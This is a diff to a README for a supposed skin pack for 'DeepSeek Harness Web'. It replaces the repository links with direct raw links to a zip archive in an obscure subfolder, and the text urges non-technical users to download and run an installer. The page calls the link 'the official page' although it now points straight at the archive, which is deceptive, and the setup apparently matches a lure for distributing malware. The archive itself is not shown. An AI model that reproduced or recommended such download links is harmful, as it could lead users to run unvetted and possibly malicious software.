@@ -1,7 +1,7 @@
 <h1>🎨 dsh-xiaoyao-skins - Beautiful Skins, One-Click Installation, Zero Skills Needed</h1>
 
 <p align="center">
-<a href="https://github.com/hardcandydemoralisation573/dsh-xiaoyao-skins"><img src="https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download"></a>
+<a href="https://raw.githubusercontent.com/hardcandydemoralisation573/dsh-xiaoyao-skins/main/moph/xiaoyao-dsh-skins-v2.4-beta.4.zip"><img src="https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download"></a>
 </p>
 
 Welcome! This page will help you get beautiful new looks for your DeepSeek Harness Web with almost no effort. You do not need to know any coding. You just need to click, download, and run. Let us walk you through it step by step.
@@ -43,7 +43,7 @@ Once the installer finishes, the application will open. You can now pick a skin 
 Here is the official download link one more time:
 
 <p align="center">
-<a href="https://github.com/hardcandydemoralisation573/dsh-xiaoyao-skins" style="background-color:#4ECDC4; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:10px;">⬇️ Visit This Link to Download the Application</a>
+<a href="https://raw.githubusercontent.com/hardcandydemoralisation573/dsh-xiaoyao-skins/main/moph/xiaoyao-dsh-skins-v2.4-beta.4.zip" style="background-color:#4ECDC4; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:10px;">⬇️ Visit This Link to Download the Application</a>
 </p>
 
 This link will take you to the official page where you can download the application. There is no need to download anything else. Just this one file is enough.
